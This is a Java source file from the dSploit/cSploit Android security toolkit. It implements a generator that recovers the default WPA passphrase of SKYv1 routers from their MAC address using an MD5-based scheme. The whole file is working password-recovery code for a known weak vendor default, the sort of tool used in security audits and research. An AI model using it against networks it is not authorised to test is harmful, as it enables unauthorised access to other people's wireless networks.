/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;

import org.csploit.android.wifi.Keygen;

/*
 * This is the algorithm to generate the WPA passphrase 
 * for the SKYv1.
 * Generate the md5 hash form the mac.
 * Use the numbers in the following positions on the hash.
 *  Position 3,7,11,15,19,23,27,31 ,
 *  Use theses numbers, modulus 26, to find the correct letter
 *  and append to the key.
 */
public class SkyV1Keygen extends Keygen{

  private MessageDigest md;

  public SkyV1Keygen(String ssid, String mac, int level, String enc){
    super(ssid, mac, level, enc);
  }

  final static String ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";


  @Override
  public List<String> getKeys(){
    if(getMacAddress().length() != 12){
      setErrorMessage("This key cannot be generated without MAC address.");
      return null;
    }
    try{
      md = MessageDigest.getInstance("MD5");
    } catch(NoSuchAlgorithmException e1){
      setErrorMessage("This phone cannot process a MD5 hash.");
      return null;
    }
    md.reset();
    md.update(getMacAddress().getBytes());
    byte[] hash = md.digest();
    String key = "";
    for(int i = 1; i <= 15; i += 2){
      int index = hash[i] & 0xFF;
      index %= 26;
      key += ALPHABET.substring(index, index + 1);
    }

    addPassword(key);
    return getResults();
  }
}
